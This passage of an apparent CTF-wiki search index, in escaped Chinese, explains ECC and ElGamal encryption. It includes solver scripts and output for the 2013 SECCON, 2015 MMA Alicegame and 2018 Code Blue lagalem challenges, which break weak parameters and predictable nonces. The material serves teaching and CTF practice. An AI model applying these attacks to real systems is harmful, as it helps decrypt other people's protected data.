\u8ba1\u7b97\u70b9 (x_2,y_2)=kP_a (x_2,y_2)=kP_a \uff0c\u5982\u679c\u4e3aO\uff0c\u5219\u4ece\u7b2c\u4e8c\u6b65\u91cd\u65b0\u5f00\u59cb\u3002 \u8ba1\u7b97 C=m+(x_2,y_2) C=m+(x_2,y_2) \u5c06 ((x_1,y_1),C) ((x_1,y_1),C) \u53d1\u9001\u7ed9A\u3002","title":"\u52a0\u5bc6"},{"location":"crypto/asymmetric/discrete-log/ecc/#_5","text":"\u89e3\u5bc6\u6b65\u9aa4\u5982\u4e0b \u5229\u7528\u79c1\u94a5\u8ba1\u7b97\u70b9 n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) n_a(x_1,y_1)=n_akG=kP_a=(x_2,y_2) \u3002 \u8ba1\u7b97\u6d88\u606f m=C-(x_2,y_2) m=C-(x_2,y_2) \u3002","title":"\u89e3\u5bc6"},{"location":"crypto/asymmetric/discrete-log/ecc/#_6","text":"\u8fd9\u91cc\u7684\u5173\u952e\u70b9\u5728\u4e8e\u6211\u4eec\u5373\u4f7f\u77e5\u9053\u4e86 (x_1,y_1) (x_1,y_1) \u4e5f\u96be\u4ee5\u77e5\u9053k\uff0c\u8fd9\u662f\u7531\u79bb\u6563\u5bf9\u6570\u7684\u95ee\u9898\u7684\u96be\u5ea6\u51b3\u5b9a\u7684\u3002","title":"\u5173\u952e\u70b9"},{"location":"crypto/asymmetric/discrete-log/ecc/#2013-seccon-ctf-quals-cryptanalysis","text":"\u8fd9\u91cc\u6211\u4eec\u4ee52013\u5e74SECCON CTF quals \u4e2d\u7684 Cryptanalysis \u4e3a\u4f8b\uff0c\u9898\u76ee\u5982\u4e0b \u8fd9\u91cc\uff0c\u6211\u4eec\u5df2\u77e5\u692d\u5706\u66f2\u7ebf\u65b9\u7a0b\u4ee5\u53ca\u5bf9\u5e94\u7684\u751f\u6210\u5143 base\uff0c\u8fd8\u77e5\u9053\u76f8\u5e94\u7684\u6a21\u6570\u4ee5\u53ca\u516c\u94a5\u4ee5\u53ca\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\u3002 \u4f46\u662f\u53ef\u4ee5\u770b\u51fa\u7684\u6211\u4eec\u7684\u6a21\u6570\u592a\u5c0f\uff0c\u6211\u4eec\u66b4\u529b\u679a\u4e3e\u83b7\u53d6\u7ed3\u679c\u3002 \u8fd9\u91cc\u76f4\u63a5\u53c2\u8003 github\u4e0a\u7684 sage \u7a0b\u5e8f\uff0c\u66b4\u529b\u8dd1\u51fa secret key\u3002\u4e4b\u540e\u4fbf\u53ef\u4ee5\u89e3\u5bc6\u4e86\u3002 a = 1234577 b = 3213242 n = 7654319 E = EllipticCurve ( GF ( n ), [ 0 , 0 , 0 , a , b ]) base = E ([ 5234568 , 2287747 ]) pub = E ([ 2366653 , 1424308 ]) c1 = E ([ 5081741 , 6744615 ]) c2 = E ([ 610619 , 6218 ]) X = base for i in range ( 1 , n ): if X == pub : secret = i print \"[+] secret:\" , i break else : X = X + base print i m = c2 - ( c1 * secret ) print \"[+] x:\" , m [ 0 ] print \"[+] y:\" , m [ 1 ] print \"[+] x+y:\" , m [ 0 ] + m [ 1 ] \u66b4\u529b\u8dd1\u51fa\u7ed3\u679c [ + ] secret: 1584718 [ + ] x: 2171002 [ + ] y: 3549912 [ + ] x+y: 5720914","title":"2013 SECCON CTF quals Cryptanalysis"},{"location":"crypto/asymmetric/discrete-log/ecc/#_7","text":"https://github.com/sonickun/ctf-crypto-writeups/tree/master/2013/seccon-ctf-quals/cryptanalysis","title":"\u53c2\u8003"},{"location":"crypto/asymmetric/discrete-log/elgamal/","text":"ElGamal \u00b6 \u6982\u8ff0 \u00b6 ElGamal\u7b97\u6cd5\u7684\u5b89\u5168\u6027\u662f\u57fa\u4e8e\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u4e8e1984\u5e74\u63d0\u51fa\uff0c\u4e5f\u662f\u4e00\u79cd\u53cc\u94a5\u5bc6\u7801\u4f53\u5236\uff0c\u65e2\u53ef\u4ee5\u7528\u4e8e\u52a0\u5bc6\u53c8\u53ef\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\u3002 \u5982\u679c\u6211\u4eec\u5047\u8bbep\u662f\u81f3\u5c11\u662f160\u4f4d\u7684\u5341\u8fdb\u5236\u7d20\u6570\uff0c \u5e76\u4e14p-1\u6709\u5927\u7d20\u56e0\u5b50 \uff0c\u6b64\u5916g\u662f Z_p^* Z_p^* \u7684\u751f\u6210\u5143\uff0c\u5e76\u4e14 y \\in Z_p^* y \\in Z_p^* \u3002\u90a3\u4e48\u5982\u4f55\u627e\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570x( 0\\leq x \\leq p-2 0\\leq x \\leq p-2 ) \uff0c\u6ee1\u8db3 g^x \\equiv y \\bmod p g^x \\equiv y \\bmod p \u5728\u7b97\u6cd5\u4e0a\u662f\u56f0\u96be\u7684\uff0c\u8fd9\u91cc\u5c06x\u8bb0\u4e3a x=log_gy x=log_gy \u3002 \u57fa\u672c\u539f\u7406 \u00b6 \u8fd9\u91cc\u6211\u4eec\u5047\u8bbeA\u8981\u7ed9B\u53d1\u9001\u6d88\u606fm\u3002 \u5bc6\u94a5\u751f\u6210 \u00b6 \u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002 \u9009\u53d6 Z_p^* Z_p^* \u7684\u751f\u6210\u5143g\u3002 \u968f\u673a\u9009\u53d6\u6574\u6570k, 0\\leq k \\leq p-2 0\\leq k \\leq p-2 \uff0c\u5e76\u8ba1\u7b97 g^k \\equiv y \\bmod p g^k \\equiv y \\bmod p \u3002 \u5176\u4e2d\u79c1\u94a5\u4e3a{k}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002 \u52a0\u5bc6 \u00b6 A\u9009\u53d6\u968f\u673a\u6570 r \\in Z_{p-1} r \\in Z_{p-1} \uff0c\u5bf9\u660e\u6587\u52a0\u5bc6 E_k(m,r)=(y_1,y_2) E_k(m,r)=(y_1,y_2) \u3002\u5176\u4e2d y_1 \\equiv g^r \\bmod p y_1 \\equiv g^r \\bmod p \uff0c y_2 \\equiv my^r \\bmod p y_2 \\equiv my^r \\bmod p \u3002 \u89e3\u5bc6 \u00b6 D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p \u3002 \u96be\u70b9 \u00b6 \u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86y1,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684r\u3002 2015 MMA CTF Alicegame \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74 MMA-CTF-2015 \u4e2d\u7684 Alicegame \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u9898\u6700\u521d\u5728\u6ca1\u6709\u7ed9\u51fa\u6e90\u7801\u7684\u65f6\u5019\u5374\u662f\u6bd4\u8f83\u96be\u505a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u7ed9\u4e00\u4e2a m\uff0c\u7ed9\u4e00\u4e2a r \u5c31\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\uff0c\uff0c\u8fd9\u592a\u96be\u60f3\u3002 \u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u6e90\u7801\uff0c\u9996\u5148\u7a0b\u5e8f\u6700\u521d\u751f\u6210\u4e86 pk \u4e0e sk ( pk , sk ) = genkey ( PBITS ) \u5176\u4e2dgenkey\u51fd\u6570\u5982\u4e0b def genkey ( k ): p = getPrime ( k ) g = random . randrange ( 2 , p ) x = random . randrange ( 1 , p - 1 ) h = pow ( g , x , p ) pk = ( p , g , h ) sk = ( p , x ) return ( pk , sk ) p\u4e3ak\u4f4d\u7684\u7d20\u6570\uff0cg\u4e3a(2,p)\u8303\u56f4\u5185\u7684\u4e66\uff0cx\u5728(1,p-1)\u8303\u56f4\u5185\u3002\u5e76\u4e14\u8ba1\u7b97\u4e86 h \\equiv g^x \\bmod p h \\equiv g^x \\bmod p \u3002\u770b\u5230\u8fd9\u91cc\uff0c\u5dee\u4e0d\u591a\u5c31\u77e5\u9053\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u6570\u57df\u4e0a\u7684ElGamal\u52a0\u5bc6\u4e86\u3002\u5176\u4e2dpk\u4e3a\u516c\u94a5\uff0csk\u4e3a\u79c1\u94a5\u3002 \u63a5\u4e0b\u6765 \u7a0b\u5e8f\u8f93\u51fa\u4e8610\u6b21m\u548cr\u3002\u5e76\u4e14\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u52a0\u5bc6 def encrypt ( pk , m , r = None ): ( p , g , h ) = pk if r is None : r = random . randrange ( 1 , p - 1 ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) \u5176\u52a0\u5bc6\u65b9\u6cd5\u786e\u5b9e\u662fElGamal\u65b9\u5f0f\u7684\u52a0\u5bc6\u3002 \u6700\u540e\u7a0b\u5e8f\u5bf9flag\u8fdb\u884c\u4e86\u52a0\u5bc6\u3002\u6b64\u65f6\u7684r\u662f\u7531\u7a0b\u5e8f\u81ea\u5df1random\u7684\u3002 \u5206\u6790\u4e00\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u5728\u5341\u8f6e\u5faa\u73af\u4e2d\u53ef\u4ee5\u63a7\u5236m\u548cr\uff0c\u5e76\u4e14 c_1 \\equiv g^r \\bmod p c_1 \\equiv g^r \\bmod p c_2 \\equiv m * h^{r} \\bmod p c_2 \\equiv m * h^{r} \\bmod p \u5982\u679c\u6211\u4eec\u8bbe\u7f6e r=1\uff0cm=1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g,c_2=h c_1=g,c_2=h \u3002 r=1\uff0cm=-1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g, c_2 = p-h c_1=g, c_2 = p-h \u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u7d20\u6570p\u3002 \u6211\u4eec\u5f97\u5230\u7d20\u6570p\u6709\u4ec0\u4e48\u7528\u5462?p\u7684\u4f4d\u6570\u5728201\u4f4d\u5de6\u53f3\uff0c\u5f88\u5927\u554a\u3002 \u4f46\u662f\u554a\uff0c\u5b83\u751f\u6210\u7d20\u6570p\u4e4b\u540e\uff0c\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u554a\u3002\u6211\u4eec\u5728\u4e4b\u524d\u8bf4\u8fc7p-1\u5fc5\u987b\u6709\u5927\u7d20\u56e0\u5b50\uff0c\u5982\u679c\u6709\u5c0f\u7684\u7d20\u56e0\u5b50\u7684\u8bdd\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u4e86\u3002\u5176\u653b\u51fb\u4e3b\u8981\u662f\u4f7f\u7528\u5230\u4e86baby step-giant step \u4e0e Pohlig-Hellman algorithm \u7b97\u6cd5\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u770b\uff0c\u8fd9\u91ccsage\u672c\u8eab\u81ea\u5e26\u7684\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u7684\u51fd\u6570\u5df2\u7ecf\u53ef\u4ee5\u5904\u7406\u8fd9\u6837\u7684\u60c5\u51b5\u4e86\uff0c\u53c2\u89c1 discrete_log \u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\uff0c\u8fd9\u4e2a\u6d88\u8017\u5185\u5b58\u6bd4\u8f83\u5927\uff0c\uff0c\u4e0d\u8981\u968f\u4fbf\u62ff\u865a\u62df\u673a\u8dd1\u3002\u3002\u3002\u8fd8\u6709\u5c31\u662f\u8fd9\u5c3c\u739b\u4ea4\u4e92\u8ba9\u6211\u5934\u75bc\u554a\uff0c\uff0c\uff0c import socket from Crypto.Util.number import * from sage.all import * def get_maxfactor ( N ): f = factor ( N ) print 'factor done' return f [ - 1 ][ 0 ] maxnumber = 1 << 70 i = 0 while 1 : print 'cycle: ' , i sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) sock . connect (( \"localhost\" , 9999 )) sock . recv ( 17 ) # get g,h sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 1024 ) ( g , h ) = eval ( data ) # get g,p sock . sendall ( \"-1 \\n \" ) sock . recv ( 512 ) sock . sendall ( \"1 \\n \" ) data = sock . recv ( 1024 ) print data if ' \\n ' in data : data = data [: data . index ( ' \\n ' )] else : # receive m= sock . recv ( 512 ) ( g , tmp ) = eval ( data ) p = tmp + h tmp = get_maxfactor ( p - 1 ) if tmp < maxnumber : print 'may be success' # skip the for cycle sock . sendall ( 'quit \\n ' ); data = sock . recv ( 1024 ) print 'receive data: ' , data data = data [ data . index ( \":\" ) + 1 :] ( c1 , c2 ) = eval ( data ) # generate the group g = Mod ( g , p ) h = Mod ( h , p ) c1 = Mod ( c1 , p ) c2 = Mod ( c2 , p ) x = discrete_log ( h , g ) print \"x = \" , x print \"Flag: \" , long_to_bytes ( long ( c2 / ( c1 ** x ))) sock . sendall ( 'quit \\n ' ) sock . recv ( 1024 ) sock . close () i += 1 \u6700\u540e\u8feb\u4e8e\u8ba1\u7b97\u673a\u5185\u5b58\u4e0d\u591f\uff0c\uff0c\u6ca1\u8ba1\u7b97\u51fa\u6765\uff0c\uff0c\uff0c\u6709\u65f6\u5019\u4f1a\u5d29\uff0c\u591a\u8fd0\u884c\u51e0\u6b21\u3002\u3002 2018 Code Blue lagalem \u00b6 \u9898\u76ee\u63cf\u8ff0\u5982\u4e0b from Crypto.Util.number import * from key import FLAG size = 2048 rand_state = getRandomInteger ( size // 2 ) def keygen ( size ): q = getPrime ( size ) k = 2 while True : p = q * k + 1 if isPrime ( p ): break k += 1 g = 2 while True : if pow ( g , q , p ) == 1 : break g += 1 A = getRandomInteger ( size ) % q B = getRandomInteger ( size ) % q x = getRandomInteger ( size ) % q h = pow ( g , x , p ) return ( g , h , A , B , p , q ), ( x ,) def rand ( A , B , M ): global rand_state rand_state , ret = ( A * rand_state + B ) % M , rand_state return ret def encrypt ( pubkey , m ): g , h , A , B , p , q = pubkey assert 0 < m <= p r = rand ( A , B , q ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) # pubkey, privkey = keygen(size) m = bytes_to_long ( FLAG ) c1 , c2 = encrypt ( pubkey , m ) c1_ , c2_ = encrypt ( pubkey , m ) print pubkey print ( c1 , c2 ) print ( c1_ , c2_ ) \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7b97\u6cd5\u5c31\u662f\u4e00\u4e2a ElGamal \u52a0\u5bc6\uff0c\u7ed9\u4e86\u540c\u4e00\u4e2a\u660e\u6587\u4e24\u7ec4\u52a0\u5bc6\u540e\u7684\u7ed3\u679c\uff0c\u5176\u7279\u70b9\u5728\u4e8e\u4f7f\u7528\u7684\u968f\u673a\u6570 r \u662f\u901a\u8fc7\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\u751f\u6210\u7684\uff0c\u5219\u6211\u4eec\u77e5\u9053 c2 \\equiv m * h^{r} \\bmod p c2 \\equiv m * h^{r} \\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p c2\\_ \\equiv m*h^{(Ar+B) \\bmod q} \\equiv m*h^{Ar+B}\\bmod p \u5219 c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p c2^A*h^B/c2\\_ \\equiv m^{A-1}\\bmod p \u5176\u4e2d\uff0cc2\uff0cc2_\uff0cA\uff0cB\uff0ch \u5747\u77e5\u9053\u3002\u5219\u6211\u4eec\u77e5\u9053 m^{A-1} \\equiv t \\bmod p m^{A-1} \\equiv t \\bmod p \u6211\u4eec\u5047\u8bbe\u5df2\u77e5 p \u7684\u4e00\u4e2a\u539f\u6839 g\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5047\u8bbe g^x \\equiv t g^x \\equiv t g^y \\equiv m g^y \\equiv m \u5219 g^{y(A-1)}\\equiv g^x \\bmod p g^{y(A-1)}\\equiv g^x \\bmod p \u5219 y(A-1) \\equiv x \\bmod p-1 y(A-1) \\equiv x \\bmod p-1 \u8fdb\u800c\u6211\u4eec\u77e5\u9053 y(A-1)-k(p-1)=x y(A-1)-k(p-1)=x \u8fd9\u91cc\u6211\u4eec\u77e5\u9053 A\uff0cp\uff0cx\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u5b9a\u7406\u6c42\u5f97 s(A-1)+w(p-1)=gcd(A-1,t-1) s(A-1)+w(p-1)=gcd(A-1,t-1) \u5982\u679cgcd(A-1,t-1)=d\uff0c\u5219\u6211\u4eec\u76f4\u63a5\u8ba1\u7b97 t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p t^s \\equiv m^{s(A-1)} \\equiv m^d \\bmod p \u5982\u679c d=1\uff0c\u5219\u76f4\u63a5\u77e5\u9053 m\u3002 \u5982\u679c d \u4e0d\u4e3a1\uff0c\u5219\u5c31\u6709\u70b9\u9ebb\u70e6\u4e86\u3002\u3002 \u8fd9\u91cc\u8fd9\u9053\u9898\u76ee\u4e2d\u6070\u597d d=1\uff0c\u56e0\u6b64\u53ef\u4ee5\u5f88\u5bb9\u6613\u8fdb\u884c\u6c42\u89e3\u3002 import gmpy2 data = open ( './transcript.txt' ) . read () . split ( ' \\n ' ) g , h , A , B , p , q = eval ( data [ 0 ]) c1 , c2 = eval ( data [ 1 ]) c1_ , c2_ = eval ( data [ 2 ]) tmp = gmpy2 . powmod ( c2 , A , p ) * gmpy2 . powmod ( h , B , p ) * gmpy2 . invert ( c2_ , p ) tmp = tmp % p print 't=' , tmp print 'A=' , A print 'p=' , p gg , x , y = gmpy2 . gcdext ( A - 1 , p - 1 ) print gg m = gmpy2 . powmod ( tmp , x , p ) print hex ( m )[ 2 :] . decode ( 'hex' ) flag \u279c 2018 -CodeBlue-lagalem git: ( master ) \u2717 python exp.py t = 24200833701856688878756977616650401715079183425722900529883514170904572086655826119242478732147288453761668954561939121426507899982627823151671207325781939341536650446260662452251070281875998376892857074363464032471952373518723746478141532996553854860936891133020681787570469383635252298945995672350873354628222982549233490189069478253457618473798487302495173105238289131448773538891748786125439847903309001198270694350004806890056215413633506973762313723658679532448729713653832387018928329243004507575710557548103815480626921755313420592693751934239155279580621162244859702224854316335659710333994740615748525806865323 A = 22171697832053348372915156043907956018090374461486719823366788630982715459384574553995928805167650346479356982401578161672693725423656918877111472214422442822321625228790031176477006387102261114291881317978365738605597034007565240733234828473235498045060301370063576730214239276663597216959028938702407690674202957249530224200656409763758677312265502252459474165905940522616924153211785956678275565280913390459395819438405830015823251969534345394385537526648860230429494250071276556746938056133344210445379647457181241674557283446678737258648530017213913802458974971453566678233726954727138234790969492546826523537158 p = 36416598149204678746613774367335394418818540686081178949292703167146103769686977098311936910892255381505012076996538695563763728453722792393508239790798417928810924208352785963037070885776153765280985533615624550198273407375650747001758391126814998498088382510133441013074771543464269812056636761840445695357746189203973350947418017496096468209755162029601945293367109584953080901393887040618021500119075628542529750701055865457182596931680189830763274025951607252183893164091069436120579097006203008253591406223666572333518943654621052210438476603030156263623221155480270748529488292790643952121391019941280923396132717 1 CBCTF { 183a3ce8ed93df613b002252dfc741b2 } \u53c2\u8003 \u00b6 https://www.math.auckland.ac.nz/~sgal018/crypto-book/solns.pdf \uff0c20.4.1","title":"Elgamal"},{"location":"crypto/asymmetric/discrete-log/elgamal/#elgamal","text":"","title":"ElGamal"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_1","text":"ElGamal\u7b97\u6cd5\u7684\u5b89\u5168\u6027\u662f\u57fa\u4e8e\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u7684\u56f0\u96be\u6027\uff0c\u4e8e1984\u5e74\u63d0\u51fa\uff0c\u4e5f\u662f\u4e00\u79cd\u53cc\u94a5\u5bc6\u7801\u4f53\u5236\uff0c\u65e2\u53ef\u4ee5\u7528\u4e8e\u52a0\u5bc6\u53c8\u53ef\u7528\u4e8e\u6570\u5b57\u7b7e\u540d\u3002 \u5982\u679c\u6211\u4eec\u5047\u8bbep\u662f\u81f3\u5c11\u662f160\u4f4d\u7684\u5341\u8fdb\u5236\u7d20\u6570\uff0c \u5e76\u4e14p-1\u6709\u5927\u7d20\u56e0\u5b50 \uff0c\u6b64\u5916g\u662f Z_p^* Z_p^* \u7684\u751f\u6210\u5143\uff0c\u5e76\u4e14 y \\in Z_p^* y \\in Z_p^* \u3002\u90a3\u4e48\u5982\u4f55\u627e\u5230\u4e00\u4e2a\u552f\u4e00\u7684\u6574\u6570x( 0\\leq x \\leq p-2 0\\leq x \\leq p-2 ) \uff0c\u6ee1\u8db3 g^x \\equiv y \\bmod p g^x \\equiv y \\bmod p \u5728\u7b97\u6cd5\u4e0a\u662f\u56f0\u96be\u7684\uff0c\u8fd9\u91cc\u5c06x\u8bb0\u4e3a x=log_gy x=log_gy \u3002","title":"\u6982\u8ff0"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_2","text":"\u8fd9\u91cc\u6211\u4eec\u5047\u8bbeA\u8981\u7ed9B\u53d1\u9001\u6d88\u606fm\u3002","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_3","text":"\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002 \u9009\u53d6 Z_p^* Z_p^* \u7684\u751f\u6210\u5143g\u3002 \u968f\u673a\u9009\u53d6\u6574\u6570k, 0\\leq k \\leq p-2 0\\leq k \\leq p-2 \uff0c\u5e76\u8ba1\u7b97 g^k \\equiv y \\bmod p g^k \\equiv y \\bmod p \u3002 \u5176\u4e2d\u79c1\u94a5\u4e3a{k}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_4","text":"A\u9009\u53d6\u968f\u673a\u6570 r \\in Z_{p-1} r \\in Z_{p-1} \uff0c\u5bf9\u660e\u6587\u52a0\u5bc6 E_k(m,r)=(y_1,y_2) E_k(m,r)=(y_1,y_2) \u3002\u5176\u4e2d y_1 \\equiv g^r \\bmod p y_1 \\equiv g^r \\bmod p \uff0c y_2 \\equiv my^r \\bmod p y_2 \\equiv my^r \\bmod p \u3002","title":"\u52a0\u5bc6"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_5","text":"D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p D_k(y_1,y_2)=y_2(y_1^k)^-1 \\bmod p \\equiv m(g^k)^r(g^{rk})^{-1} \\equiv m \\bmod p \u3002","title":"\u89e3\u5bc6"},{"location":"crypto/asymmetric/discrete-log/elgamal/#_6","text":"\u867d\u7136\u6211\u4eec\u77e5\u9053\u4e86y1,\u4f46\u662f\u6211\u4eec\u5374\u6ca1\u6709\u529e\u6cd5\u77e5\u9053\u5176\u5bf9\u5e94\u7684r\u3002","title":"\u96be\u70b9"},{"location":"crypto/asymmetric/discrete-log/elgamal/#2015-mma-ctf-alicegame","text":"\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74 MMA-CTF-2015 \u4e2d\u7684 Alicegame \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u9898\u6700\u521d\u5728\u6ca1\u6709\u7ed9\u51fa\u6e90\u7801\u7684\u65f6\u5019\u5374\u662f\u6bd4\u8f83\u96be\u505a\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u7ed9\u4e00\u4e2a m\uff0c\u7ed9\u4e00\u4e2a r \u5c31\u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\uff0c\uff0c\u8fd9\u592a\u96be\u60f3\u3002 \u6211\u4eec\u6765\u7b80\u5355\u5206\u6790\u4e00\u4e0b\u6e90\u7801\uff0c\u9996\u5148\u7a0b\u5e8f\u6700\u521d\u751f\u6210\u4e86 pk \u4e0e sk ( pk , sk ) = genkey ( PBITS ) \u5176\u4e2dgenkey\u51fd\u6570\u5982\u4e0b def genkey ( k ): p = getPrime ( k ) g = random . randrange ( 2 , p ) x = random . randrange ( 1 , p - 1 ) h = pow ( g , x , p ) pk = ( p , g , h ) sk = ( p , x ) return ( pk , sk ) p\u4e3ak\u4f4d\u7684\u7d20\u6570\uff0cg\u4e3a(2,p)\u8303\u56f4\u5185\u7684\u4e66\uff0cx\u5728(1,p-1)\u8303\u56f4\u5185\u3002\u5e76\u4e14\u8ba1\u7b97\u4e86 h \\equiv g^x \\bmod p h \\equiv g^x \\bmod p \u3002\u770b\u5230\u8fd9\u91cc\uff0c\u5dee\u4e0d\u591a\u5c31\u77e5\u9053\uff0c\u8fd9\u5e94\u8be5\u662f\u4e00\u4e2a\u6570\u57df\u4e0a\u7684ElGamal\u52a0\u5bc6\u4e86\u3002\u5176\u4e2dpk\u4e3a\u516c\u94a5\uff0csk\u4e3a\u79c1\u94a5\u3002 \u63a5\u4e0b\u6765 \u7a0b\u5e8f\u8f93\u51fa\u4e8610\u6b21m\u548cr\u3002\u5e76\u4e14\uff0c\u5229\u7528\u5982\u4e0b\u51fd\u6570\u52a0\u5bc6 def encrypt ( pk , m , r = None ): ( p , g , h ) = pk if r is None : r = random . randrange ( 1 , p - 1 ) c1 = pow ( g , r , p ) c2 = ( m * pow ( h , r , p )) % p return ( c1 , c2 ) \u5176\u52a0\u5bc6\u65b9\u6cd5\u786e\u5b9e\u662fElGamal\u65b9\u5f0f\u7684\u52a0\u5bc6\u3002 \u6700\u540e\u7a0b\u5e8f\u5bf9flag\u8fdb\u884c\u4e86\u52a0\u5bc6\u3002\u6b64\u65f6\u7684r\u662f\u7531\u7a0b\u5e8f\u81ea\u5df1random\u7684\u3002 \u5206\u6790\u4e00\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u5728\u5341\u8f6e\u5faa\u73af\u4e2d\u53ef\u4ee5\u63a7\u5236m\u548cr\uff0c\u5e76\u4e14 c_1 \\equiv g^r \\bmod p c_1 \\equiv g^r \\bmod p c_2 \\equiv m * h^{r} \\bmod p c_2 \\equiv m * h^{r} \\bmod p \u5982\u679c\u6211\u4eec\u8bbe\u7f6e r=1\uff0cm=1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g,c_2=h c_1=g,c_2=h \u3002 r=1\uff0cm=-1\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u83b7\u5f97 c_1=g, c_2 = p-h c_1=g, c_2 = p-h \u3002\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u7d20\u6570p\u3002 \u6211\u4eec\u5f97\u5230\u7d20\u6570p\u6709\u4ec0\u4e48\u7528\u5462?p\u7684\u4f4d\u6570\u5728201\u4f4d\u5de6\u53f3\uff0c\u5f88\u5927\u554a\u3002 \u4f46\u662f\u554a\uff0c\u5b83\u751f\u6210\u7d20\u6570p\u4e4b\u540e\uff0c\u6ca1\u6709\u8fdb\u884c\u68c0\u67e5\u554a\u3002\u6211\u4eec\u5728\u4e4b\u524d\u8bf4\u8fc7p-1\u5fc5\u987b\u6709\u5927\u7d20\u56e0\u5b50\uff0c\u5982\u679c\u6709\u5c0f\u7684\u7d20\u56e0\u5b50\u7684\u8bdd\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u653b\u51fb\u4e86\u3002\u5176\u653b\u51fb\u4e3b\u8981\u662f\u4f7f\u7528\u5230\u4e86baby step-giant step \u4e0e Pohlig-Hellman algorithm \u7b97\u6cd5\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u770b\uff0c\u8fd9\u91ccsage\u672c\u8eab\u81ea\u5e26\u7684\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u7684\u51fd\u6570\u5df2\u7ecf\u53ef\u4ee5\u5904\u7406\u8fd9\u6837\u7684\u60c5\u51b5\u4e86\uff0c\u53c2\u89c1 discrete_log \u3002 